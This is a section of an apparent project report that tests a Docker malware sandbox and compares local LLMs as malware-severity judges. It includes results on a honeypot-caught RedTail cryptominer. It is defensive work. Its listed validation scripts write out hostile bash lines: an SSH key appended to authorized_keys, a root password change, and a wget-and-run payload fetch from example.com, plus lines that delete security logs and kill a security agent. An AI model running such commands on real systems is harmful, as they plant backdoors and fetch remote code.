\section{Testing and Validation}
\noindent
This section presents the testing and validation activities used to assess the final prototype. For clarity, the evaluation is divided into three parts. First, it revisits the infrastructure and sandbox validation performed during the midterm phase in order to show that the Docker-based analysis workflow can execute suspicious files in isolation and capture relevant behavioral artifacts. Second, it evaluates the earlier rule-based verdict system, including its strengths and limitations when applied to representative malware-like behaviors and a full malware sample. Third, it presents the final AI-agent-based validation using the selected \texttt{llama3.1} model, which operates on the structured execution reports produced by the same monitoring pipeline.

\subsection{Test Methodology and Setup}
\noindent
The tests are performed using the implemented prototype described in the previous sections. A host container is used as the target environment, while the scanner container is responsible for locating suspicious files, launching sandboxed execution, and collecting behavioral evidence. The analysis focuses on observable filesystem changes before and after execution, supplemented by container-level inspection.

\subsubsection{Test Scope}
\noindent
The current evaluation is centered around representative malware-like behaviors that are relevant to a behavior-based detection system. The scenarios include:
\begin{itemize}
    \item Early stage testing included:
    \begin{itemize}
        \item Destructive "evil" scripts that delete files
        \item Ransomware-like behavior that modifies (encrypts) user files 
        \item C2-Downloader, which downloads and deploys an agent (creates a process), hereby touching sensitive paths such as systemd
    \end{itemize}
    \item Testing the verdict
    \begin{itemize}
        \item Test primitive/obvious malware on the verdict
        \item Test downloader scripts on the network traffic verdict
    \end{itemize}
    \item Collect and test malware samples
    \item Test a real, unfiltered malware program 
\end{itemize}
\noindent
These scenarios were chosen because they produce concrete system effects, and is definitive for the different iterations of the project prototype.

\newpage

\subsection{Infrastructure and Sandbox Validation}
\noindent
The first validation step focused on confirming that the sandbox and monitoring pipeline behaved as intended. These tests originate from the midterm phase of the project, but they remain important in the final report because they establish that suspicious scripts can be executed in isolation and that the resulting filesystem and container-level artifacts can be observed reliably.

\subsubsection{Destructive Script Simulation}

\paragraph{Destructive Script Simulation}
\begin{figure}[ht]
    \centering
    \includegraphics[width=0.8\linewidth]{images/evil.png}
    \caption{Detection of malicious file \texttt{evil.sh}}
    \label{fig:evil}
\end{figure}
The \texttt{evil.sh} script demonstrated destructive behavior by deleting files within the \texttt{Desktop} directory. These actions were successfully captured in the \textit{deleted files} output (see Figure~\ref{fig:evil}), where multiple files were listed as removed. This validates the system’s ability to detect data loss or sabotage through filesystem comparison.

\subsubsection{Ransomware Simulation}
\paragraph{Ransomware Simulation}
\begin{figure}[ht]
    \centering
    \includegraphics[width=0.8\linewidth]{images/ransomware.png}
    \caption{Detection of malicious file \texttt{ransomware.sh}}
    \label{fig:ransom}
\end{figure}
The \texttt{ransomware.sh} script resulted in multiple file modifications within the user’s \texttt{Documents} directory. This behavior was correctly reflected in the \textit{modified files} output , where several \texttt{.txt} files were detected as altered -- As depicted in Figure~\ref{fig:ransom}. This confirms that the hash-based snapshot mechanism is effective in identifying content changes within monitored directories, which is characteristic of ransomware activity.



\subsubsection{Agent Installation Simulation}
\paragraph{Agent Installation Simulation}
\begin{figure}[H]
    \centering
    \includegraphics[width=0.8\linewidth]{images/agent.png}
    \caption{Detection of malicious file \texttt{agent.sh}}
    \label{fig:agent}
\end{figure}
The \texttt{agent\_installer.sh} script exhibited more advanced behavior by attempting to install a persistent agent. Unlike the previous cases, no changes were detected within the monitored \texttt{/sandbox/home} directory using hash-based snapshots (see Figure~\ref{fig:agent}). However, Docker’s \texttt{diff} functionality revealed significant system-level modifications, including:
\begin{itemize}
    \item Creation of files in \texttt{/opt/agent}
    \item Addition of a persistence mechanism in \texttt{/etc/init.d}
\end{itemize}
\noindent
This demonstrates a key limitation of localized snapshotting: changes occurring outside the monitored directory may go undetected. In contrast, \texttt{docker diff} provides a comprehensive view of all filesystem changes within the container, making it particularly effective for identifying persistence mechanisms and system-level modifications.

\newpage

\subsection{Primitive Malware Simulation Tests}
\noindent
After validating the sandbox itself, the next step was to exercise the legacy rule-based verdict system on more focused malware-like behaviors. These tests use deliberately simple scripts in order to isolate specific signals, such as suspicious outbound traffic, payload retrieval, and persistence-related activity, before moving on to broader evaluation of the verdict logic.

\subsubsection{Traffic Verdict Testing}
\noindent
Monitoring the network activity of a potentially malicious file is important because many malware types rely on external communication during execution. Downloaders and installer scripts often create outbound connections to retrieve additional payloads, communicate with command-and-control infrastructure, or verify internet connectivity. Observing these connections can therefore provide useful behavioral indicators, even when no visible filesystem changes are detected.

\vspace{1em}

A test was performed using the script \texttt{mixed-connections.sh} from Appendix~\ref{appendix-a}. The script performs three different outbound connection attempts using \texttt{curl}: a standard HTTP header request to a highly reported IP address from AbuseIPDB, a download attempt from a local server, and a header request to a known Tor node. The purpose of the test was to evaluate whether the traffic monitoring component could detect and classify suspicious network-related behavior during sandbox execution.

\begin{figure}[h]
    \centering
    \includegraphics[width=1\linewidth]{images/tests_traffic_verdict_shorter.jpg}
    \caption{Testing the traffic verdict}
    \label{fig:test-traffic}
\end{figure}

Figure~\ref{fig:test-traffic} shows the output generated during execution of the \texttt{mixed-connections.sh} test script. The monitoring component successfully detected multiple outbound TCP connection attempts, including connections to a Tor node and a highly reported IP address from AbuseIPDB. For each observed IP address, the system queries the AbuseIPDB API to retrieve metadata such as abuse reports, country of origin, Tor usage, and an associated abuse confidence score. In the current prototype, this information is presented as part of a separate traffic verdict. Future versions of the verdict logic are intended to incorporate these scores directly into the final malware classification in order to strengthen detection of network-related malicious behavior.

\subsubsection{Agent Installation with Traffic Verdict}
\noindent
In order to evaluate the extended monitoring functionality, the agent installation scenario was repeated with the traffic verdict component enabled. The purpose of this test was to observe whether the system could successfully capture and present network-related behavior alongside the existing filesystem-based analysis.


\begin{figure}[h]
    \centering
    \includegraphics[width=1\linewidth]{images/tests_agent_verdict.jpg}
    \caption{Agent Installer with Traffic Verdict}
    \label{fig:agent-verdict}
\end{figure}

The traffic output also confirms that the sandbox successfully connected to the externally hosted server at \texttt{138.68.95.15}, from which the agent payload was retrieved. Furthermore, the resulting filesystem changes show that the agent was successfully installed and moved into the target system paths inside the sandbox environment.

\newpage
\subsection{Rule-Based Verdict Evaluation}
\noindent
The primitive simulations above were followed by a broader evaluation of the earlier rule-based verdict system. This stage was intended to show how the legacy scoring logic behaved when exposed not only to focused synthetic scripts, but also to a realistic malware sample collected from an external environment.

\subsubsection{Real Malware Validation: RedTail}
\noindent
Malware samples collected from MalwareBazaar are often incomplete and may only contain setup scripts or payload installers rather than the full malware executable. Because of this, a Cowrie honeypot was deployed with weak SSH credentials in order to attract automated bot scanners and collect real-world malware samples. During the collection period, the honeypot captured a sample identified as RedTail.

\vspace{1em}

RedTail is a Linux-based cryptominer that targets exposed systems and installs persistent mining payloads through services and cron jobs. Before the run shown in Figure 9, the verdict logic had already been updated to recognize RedTail-like behavior, especially dropped payloads, persistence in sensitive system paths, and multi-architecture miner artifacts. The purpose of this test was therefore to verify that the updated verdict correctly classified a realistic malware sample in the Docker-based sandbox.



\begin{figure}[h]
    \centering
    \includegraphics[width=1\linewidth]{images/tests_redtail_shorter.jpg}
    \caption{RedTail Cryptominer collected on HoneyPot}
    \label{fig:redtail-log}
\end{figure}

Based on the observed activity, the verdict system classified the sample as likely malicious with a high behavior score. The detection was primarily triggered by the creation of executable payloads, modifications to sensitive system paths, and the installation of persistence mechanisms commonly associated with cryptomining malware. 







\newpage



\subsubsection{Summary of Rule-Based Results}
\noindent
The early testing phase showed that the implemented monitoring pipeline was able to capture relevant behavioral artifacts from executed samples. Across the different test scenarios, the system successfully observed file modifications, file deletion activity, creation of new executables, network-related behavior, and persistence-related actions. These results confirmed that the Docker-based sandbox and the surrounding Python control logic were functioning as intended and that the collected execution data was sufficiently detailed to support automated assessment. In this sense, the rule-based verdict approach was useful as an initial validation step, since it demonstrated that suspicious behavior could be detected and translated into a preliminary classification.

\subsection{Limitations of the Rule-Based Approach}
\noindent
Although the previous approach was effective for detecting clearly defined malicious actions, the testing also revealed important limitations. The hardcoded verdict depended on manually selected thresholds, explicit score assignments, and predefined combinations of behaviors. This made the decision logic difficult to generalize beyond the specific scenarios used during development. Behaviors that were individually benign could become suspicious in combination, while some malicious patterns were difficult to represent through fixed rules alone. As a result, the verdict logic became increasingly brittle as more edge cases and behavioral variations were considered, making further refinement more complex and less scalable.

\subsection{Transition to AI-Agent-Based Assessment}
\noindent
The earlier tests were therefore not wasted effort, but instead served as an important foundation for the next design step. They validated that the system could reliably execute suspicious files, collect meaningful behavioral artifacts, and identify the types of observations that should influence a final verdict. At the same time, they showed that converting these observations into a robust hardcoded decision model was difficult. This motivated the transition toward an AI-agent-based assessment approach, where the collected execution report is analyzed contextually rather than only through fixed scoring rules. The AI agent was therefore introduced not to replace the earlier work, but to build on it by improving the system's ability to interpret combined behavioral evidence in a more flexible and scalable way.

\vspace{1em}

Following the previous test phase, the collected output was refined into a structured JSON format containing the behavioral information most relevant to the final assessment. This JSON report serves as the input basis for the AI agent and gathers the observed execution artifacts in a form that can be processed more consistently. In addition, an AI persona-based approach was introduced by initializing the agent with a predefined persona described in a YAML file. This persona defines the intended analytical role and helps guide the style and focus of the generated verdict. Strictly speaking, neither JSON nor YAML is strictly required, since the agent is capable of reasoning over unstructured text alone. However, the use of structured formats improves modularity and maintainability, and also makes the system easier to extend in the future, for example toward visualization in a web-based user interface.



\subsection{AI Agent: Model Selection}
\noindent
To evaluate and find the best suited AI-based verdict, a set of tests similar to the earlier scenarios was conducted using the same input cases from the \texttt{Tests} directory. The purpose was to examine whether an AI agent could produce a consistent severity assessment when presented with the structured execution report instead of relying on hardcoded verdict logic. Four locally hosted models were tested through Ollama: \texttt{llama3.1:latest}, \texttt{mistral:latest}, \texttt{qwen2.5-coder:7b}, and \texttt{mistral-nemo:12b}. For each test case, the generated verdict was compared in terms of severity level and numerical risk score.

Table~\ref{tab:ai-agent-severity-comparison} shows the resulting severity assessments. Overall, the outputs were relatively consistent for the clearly suspicious cases, although the models differed in how aggressively they assigned the highest severity. Differences were also visible between the four reported models in both risk score calibration and runtime behavior, which made the comparison useful not only for classification quality but also for practical performance in repeated local testing.

\subsubsection{Selected models for testing}

The selected model set consisted of \texttt{llama3.1:latest}, \texttt{mistral:latest}, \texttt{qwen2.5-coder:7b}, and \texttt{mistral-nemo:12b}. These models were chosen to provide a mix of general-purpose instruction models and a code-oriented model, while still remaining practical to run locally through Ollama.

The evaluation was performed on five behavioral test cases from the \texttt{Tests} directory: \texttt{agent\_test}, \texttt{cryptominer\_test}, \texttt{legitimate\_test}, \texttt{stealth\_test}, and \texttt{traffic\_test}. Together, these cases were used to check how the models reacted to clearly suspicious behavior, ambiguous or stealth-oriented behavior, ordinary benign execution, and samples with notable network-related activity. On that basis, the following comparison table summarizes the severity labels and risk scores assigned by each model.

\subsubsection{Model comparison}

\begin{table}[h]
\centering
\scriptsize
\begin{tabular}{lcccc}
\hline
\textbf{Test case} & \textbf{llama3.1} & \textbf{mistral} & \textbf{qwen2.5-coder} & \textbf{mistral-nemo} \\
\hline
\texttt{agent\_test} & High (80) & High (85) & Medium (50) & High (75) \\
\texttt{cryptominer\_test} & Critical (95) & Medium (40) & High (85) & Medium (60) \\
\texttt{legitimate\_test} & Low (20) & Low (10) & Low (20) & Low (10) \\
\texttt{stealth\_test} & High (80) & Medium (40) & Medium (30) & Medium (60) \\
\texttt{traffic\_test} & High (80) & Medium (50) & Low (20) & Low (10) \\
\hline
\end{tabular}
\caption{Comparison of severity levels and risk scores produced by the tested Ollama models.}
\label{tab:ai-agent-severity-comparison}
\end{table}

The comparison shows that \texttt{llama3.1:latest} produced the most consistently high-severity assessments across the suspicious cases, while also keeping the legitimate case in the \textit{Low} range. \texttt{mistral:latest} and \texttt{mistral-nemo:12b} were generally more conservative in their scoring, whereas \texttt{qwen2.5-coder:7b} often gave lower scores for stealth and traffic-oriented behavior but still identified the cryptominer scenario as \textit{High}.

\subsubsection{Runtime comparison}

\begin{table}[h]
\centering
\begin{tabular}{lccc}
\hline
\textbf{Model} & \textbf{Total time (s)} & \textbf{Avg/test (s)} & \textbf{Tests} \\
\hline
\texttt{llama3.1:latest} & 19 & 3.8 & 5 \\
\texttt{mistral:latest} & 21 & 4.2 & 5 \\
\texttt{qwen2.5-coder:7b} & 20 & 4.0 & 5 \\
\texttt{mistral-nemo:12b} & 79 & 15.8 & 5 \\
\hline
\end{tabular}
\caption{Runtime comparison for the reported models across the five AI-verdict test cases.}
\label{tab:ai-agent-runtime-comparison}
\end{table}

In practical terms, the runtime results show that \texttt{llama3.1:latest}, \texttt{mistral:latest}, and \texttt{qwen2.5-coder:7b} were all within a narrow range of roughly four seconds per test case. By contrast, \texttt{mistral-nemo:12b} was significantly slower, averaging 15.8 seconds per test, which makes it notably less efficient for repeated local evaluation despite producing usable results.

\subsubsection{Reference Severity for the Test Cases}
\noindent
To interpret the model outputs beyond their mutual agreement, it is useful to
establish a reference expectation for each test case, derived from the nature of
the behavioral artifacts contained in the corresponding execution report. These
expectations are analyst-derived rather than externally validated labels, but
they provide a consistent baseline against which the calibration of each model
can be discussed. Table~\ref{tab:reference-severity} summarizes these
expectations together with the dominant indicator driving each one.

\begin{table}[h]
\centering
\footnotesize
\renewcommand{\arraystretch}{1.25}
\begin{tabular}{lcp{8cm}}
\hline
\textbf{Test case} & \textbf{Expected severity} & \textbf{Dominant indicator} \\
\hline
\texttt{legitimate\_test}  & Low      & \texttt{apt} package updates from Canonical/Ubuntu repositories, updates are however triggered via a script \\
\texttt{agent\_test}       & Medium--High & \texttt{systemd} persistence and unknown agent service, downloader is from non-flagged IP \\
\texttt{cryptominer\_test} & Critical & Multi-architecture payloads with \texttt{systemd} and \texttt{cron} persistence \\
\texttt{stealth\_test}     & High     & \texttt{cron} persistence with hidden, disguised worker artifacts tailored to trick the Agent \\
\texttt{traffic\_test}     & High     & Outbound contact with abuse-flagged IPs and a Tor exit node, highly suspicious connections but no downloads \\
\hline
\end{tabular}
\caption{Reference severity expectations used to assess model calibration, with the
primary behavioral indicator motivating each expectation.}
\label{tab:reference-severity}
\end{table}

\noindent
The reference severities in Table~\ref{tab:reference-severity} are based on the active persona definition in \texttt{persona.yaml}. In line with this persona, severity is derived from observed behavior and concrete combined indicators rather than speculation about what a sample might theoretically do. As a result, weak or ambiguous signals should remain conservatively scored, while persistence, evasion, suspicious outbound traffic, and other corroborating behaviors justify higher severity when they appear together.

\subsubsection{Discussion of Verdict Quality}
\noindent
Measured against these expectations, the four models diverged most clearly on the
two cases that the rule-based predecessor was least equipped to handle: the
network-reputation case (\texttt{traffic\_test}) and the stealth-oriented
persistence case (\texttt{stealth\_test}).

\noindent
\paragraph{\texttt{llama3.1:latest}} produced the closest overall alignment with the reference
expectations. It was the only model to escalate \texttt{traffic\_test} to
\textit{High}, correctly identifying both the abuse-flagged destination and the
Tor exit node, and it was also the only model to rate \texttt{stealth\_test} as
\textit{High}. It assigned the cryptominer sample the highest severity of any
model (\textit{Critical}) while still keeping the legitimate update script in the
\textit{Low} range. Its principal weakness was not severity calibration but
classification labelling: it repeatedly applied the label
\textit{credential stealer} even to the cryptominer and stealth samples, where the
evidence does not support that specific category.

\noindent
\paragraph{\texttt{mistral:latest}}
produced well-formed output and reasonable labels, but was
systematically conservative. It under-scored both the cryptominer sample
(\textit{Medium}, 40) and the stealth sample (\textit{Medium}, 40), and rated the
network case only \textit{Medium} (50) despite explicitly noting the Tor exit node
in its own evidence list. This indicates that the model recognized the relevant
indicators but did not escalate the resulting severity accordingly.

\noindent
\paragraph{\texttt{qwen2.5-coder:7b} }correctly identified the cryptominer sample as
\textit{High}, but produced the most pronounced under-call on the network case,
rating \texttt{traffic\_test} as \textit{Low} (20) and stating that no connections
to known-malicious infrastructure were present. This conflicts with the reputation
data in the report and represents a false negative on genuinely flagged
infrastructure.

\noindent
\paragraph{\texttt{mistral-nemo:12b}} produced the weakest result on the network case,
classifying \texttt{traffic\_test} as benign (\textit{Low}, 10) on the grounds
that no payload was exchanged and no filesystem changes occurred, while
disregarding the reputation verdicts entirely. It also under-rated the cryptominer
sample. Combined with its runtime (discussed below), this makes it the least
favorable trade-off in the set.

\subsubsection{Cross-Model Observations}
\noindent
Two patterns emerge from the comparison that are more informative than any single
model's score. 

First, agreement was high on the unambiguous cases and low on the ambiguous ones.
All four models rated \texttt{legitimate\_test} as \textit{Low}, and all four
treated the multi-architecture cryptominer payloads as suspicious, differing only
in how aggressively they scored them. Divergence was concentrated in the stealth
and network cases, which is precisely the region where contextual interpretation
was expected to add value over fixed rules.

\vspace{1em}

Second, the network case acted as the primary discriminator between the models.
Three of the four did not translate the structured reputation data
(\texttt{traffic\_verdict}, including abuse scores and the \texttt{isTor} flag)
into an elevated severity, and two produced explicit false negatives. The common
cause was an over-reliance on filesystem activity: because
\texttt{traffic\_test} contained no file changes, the models that under-scored it
appear to have treated the absence of filesystem modification as evidence of
benign behavior, rather than weighting the network reputation signal
independently. This is an interpretation gap rather than a knowledge gap, and it
is notable because it is a failure mode a hardcoded rule keyed on
\texttt{score} or \texttt{isTor} would not exhibit. The AI-based approach
therefore trades the brittleness of fixed rules for a degree of interpretation
variance, which has direct implications for persona design: signals that must
never be ignored should be named explicitly in the persona and bound to an
escalation rule, rather than left to be inferred.

\subsubsection{Severity Calibration versus Classification Accuracy}
\noindent
A further observation is that the numeric \texttt{risk\_score} and severity label
were more reliable across models than the free-text \texttt{classification}
field. Several models arrived at a defensible severity while attaching an
inaccurate category, with \textit{credential stealer} applied to samples whose
behavior is more consistent with mining or generic persistence. For a triage
pipeline this is an acceptable ordering of strengths, since the severity drives
prioritization while the classification is advisory, but it suggests that
downstream consumers should treat the classification label as a hint rather than
an authoritative determination.

\subsubsection{Runtime and Practical Trade-offs}
\noindent
The runtime results in Table~\ref{tab:ai-agent-runtime-comparison} reinforce the
quality findings. The three 7--8B models clustered around four seconds per case,
whereas \texttt{mistral-nemo:12b} required roughly four times as long at
15.8~seconds per case. Crucially, this additional cost did not translate into
better verdicts: \texttt{mistral-nemo:12b} was both the slowest model and one of
the two that failed the network case outright. Within this set, larger parameter
count therefore did not correlate with higher assessment quality, and the
practical sweet spot for repeated local evaluation lay firmly in the 7--8B tier.

\subsubsection{Model Selection}
\noindent
Taking calibration, error direction, and runtime together,
\texttt{llama3.1:latest} is the most suitable model for this pipeline. It was the
only model to handle all five cases in the expected direction, it produced the
fewest dangerous false negatives, and it was tied for the fastest runtime. For a
security-triage setting in which a missed detection is more costly than an
over-cautious flag, its tendency to score slightly high on ambiguous cases is the
preferable failure direction, in contrast to the under-scoring observed in the
other three models on the stealth and network cases.

\subsubsection{Threats to Validity}
\noindent
Several limitations should be acknowledged. The reference severities in
Table~\ref{tab:reference-severity} are analyst-derived and not validated against
an external ground-truth corpus, so they describe expected rather than
authoritative labels. The evaluation covers five test cases, which is sufficient
to expose behavioral differences but too small to support statistical claims
about accuracy. Each case was assessed in a single run per model; because local
generation is non-deterministic unless the temperature is fixed, repeated runs
may yield some variation in the exact scores, and reporting per-case variance
would strengthen future comparisons. Finally, the outputs depend on a shared
persona definition, so the observed differences reflect the combination of model
and persona rather than the model in isolation; a revised persona that names the
reputation signal explicitly would be expected to shift the network-case results
for the conservative models in particular.

\newpage

\subsection{AI Agent-Based Verdict Testing}
\noindent
As discussed in the preceding comparison, \texttt{llama3.1:latest} was selected as
the most suitable model for the AI-based verdict stage. The choice was not based
on a single favorable output, but on the overall balance between severity
calibration, handling of ambiguous cases, and runtime. In particular, it was the
only tested model that consistently treated the stealth and network-oriented
cases in the expected direction while also keeping the legitimate case in the
\textit{Low} range. This made it the most practical candidate for continued use
in the pipeline.

\noindent
Having selected a model, the next step is not merely to compare it against the
other candidates, but to examine how it behaves across a broader set of simple
validation scenarios. The purpose of these follow-up tests is therefore to check
whether the chosen model remains sensible when presented with more narrowly
defined patterns of suspicious behavior, such as credential modification,
persistence, reconnaissance, downloader activity, and combinations of these
signals. Rather than serving as a benchmark between models, this stage acts as a
sanity check on whether the selected AI agent produces outputs that remain
plausible across different script-driven behaviors.


\subsubsection{llama3.1 Validation Scripts}
\noindent
The following scripts were used as compact validation inputs for
\texttt{llama3.1:latest}. Each one represents a small and deliberately readable
behavioral pattern, making it easier to inspect whether the resulting verdict
matches the dominant activity encoded in the script. Some cases isolate a single
signal, while others combine several suspicious actions in order to observe how
the model weighs them together.


\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{account\_takeover.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
echo "root:BadPassword123" | chpasswd

\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{cleanup\_tampering.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
rm -rf /tmp/secure.sh
rm -rf /tmp/auth.sh
echo > /etc/hosts.deny
pkill sleep
\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{combined\_attack.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
uname -a
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
wget http://example.com/payload.sh
chmod +x payload.sh
sh payload.sh
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{defense\_evasion.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
rm -f /tmp/security.log
pkill security_agent




\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{downloader\_persistence.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
wget http://example.com/payload.sh
chmod +x payload.sh
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{downloader.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
wget http://example.com/payload.sh
chmod +x payload.sh
sh payload.sh

\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{miner\_recon.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
cat /proc/cpuinfo | grep name | wc -l
free -m
lscpu
df -h
top -bn1
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{password\_modification.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
echo "root:BadPassword123" | chpasswd




\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{reconnaissance.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
uname -a
whoami
lscpu
free -m
df -h
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{ssh\_persistence.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

\end{minted}
\end{minipage}

\vspace{1em}

\vspace{1em}

The selected validation scripts cover a range of behavioral categories commonly associated with malicious activity, including credential modification, persistence establishment, reconnaissance, payload retrieval, and defense evasion. Several of the scripts are inspired by command sequences observed on a publicly exposed honeypot, while others were constructed to isolate specific behavioral patterns for testing purposes. The goal is not to evaluate the AI agent against a particular malware family, but rather to determine whether it can correctly interpret the underlying behavior represented by the collected execution artifacts.

\vspace{1em}

The validation set intentionally includes both single-purpose scripts and multi-stage attack simulations. Single-purpose scripts make it possible to evaluate whether the model correctly identifies a dominant malicious signal, such as password modification or SSH persistence. In contrast, the combined scripts test whether the model can reason about multiple suspicious actions occurring together and appropriately increase the assessed severity level. The expected outcome is that the AI agent produces consistent assessments that reflect both the type and combination of observed behaviors.

\vspace{1em}

These scripts are executed through the same sandboxing and monitoring pipeline as
the earlier test cases. The intention is therefore not to change the execution
method, but to supply a new set of compact validation inputs while keeping the
artifact-collection process unchanged. After execution, the observed behavior is
saved in the same structured JSON format used throughout the project, and that
report is then passed to the AI wrapper for assessment.



\newpage

The stored output format captures the main artifact categories relevant to the
verdict, including execution metadata, network activity, filesystem changes, and
captured script output. A simplified representation of the report structure is
shown below:

\begin{minted}[fontsize=\scriptsize,frame=single]{json}
{
  "target_file": "",
  "execution_time": 1,
  "exit_code": 0,
  "network_connections": [],
  "traffic_verdict": [],
  "filesystem_changes": {
    "modified": [],
    "new": [],
    "deleted": []
  },
  "malware_output": {
    "content": "",
    "lines": 0,
    "truncated": false
  }
}
\end{minted}

\noindent
Using the same report structure across both the earlier benchmark cases and these
validation scripts makes the later comparison more meaningful: the model is not
judging the raw script text directly, but the monitored execution artifacts
produced by a consistent reporting pipeline.


\subsubsection{Repeated-Run Stability Test}
\noindent
After defining the validation scripts, an additional stability test was conducted
in order to examine whether the selected model would vary its verdicts across
repeated executions of the same input data. This was relevant because local
language-model inference is not necessarily deterministic in practice, and a
useful verdict component should ideally not fluctuate significantly when the
underlying execution report is unchanged.

\noindent
To test this, the \texttt{llama3.1:latest} model was run five times on the same
set of validation cases. For each run, the resulting severity label and
\texttt{risk\_score} were recorded. Table~\ref{tab:llama31-repeatability}
summarizes the dominant outcome for each script together with the level of
agreement across the repeated runs.


\newpage



\begin{table}[h]
\centering
\footnotesize
\begin{tabular}{lccc}
\hline
\textbf{Script} & \textbf{Repeated result} & \textbf{Avg. score} & \textbf{Agreement} \\
\hline
\texttt{account\_takeover.sh} & Critical & 95 & 5/5 identical \\
\texttt{cleanup\_tampering.sh} & High & 80 & 5/5 identical \\
\texttt{combined\_attack.sh} & High & 80 & 5/5 identical \\
\texttt{defense\_evasion.sh} & Low & 10 & 5/5 identical \\
\texttt{downloader.sh} & Medium & 50 & 5/5 identical \\
\texttt{downloader\_persistence.sh} & Low & 20 & 5/5 identical \\
\texttt{miner\_recon.sh} & Low & 10 & 5/5 identical \\
\texttt{password\_modification.sh} & High & 80 & 5/5 identical \\
\texttt{reconnaissance.sh} & Low & 10 & 5/5 identical \\
\texttt{ssh\_persistence.sh} & High & 80 & 5/5 identical \\
\hline
\end{tabular}
\caption{Repeated-run stability of \texttt{llama3.1:latest} across five executions of the same validation inputs.}
\label{tab:llama31-repeatability}
\end{table}

\noindent
The repeated-run test showed no observable variation in either severity label or
\texttt{risk\_score} across the five executions. In this setting, the model
therefore behaved as effectively deterministic for the tested inputs. This is a
useful practical property, since it suggests that the main source of uncertainty
in the AI-based verdict does not stem from run-to-run instability, but rather
from how well the chosen test cases and persona capture the intended notion of
maliciousness. In other words, the remaining challenge is less about output
randomness and more about calibration of the model against the right behavioral
signals.
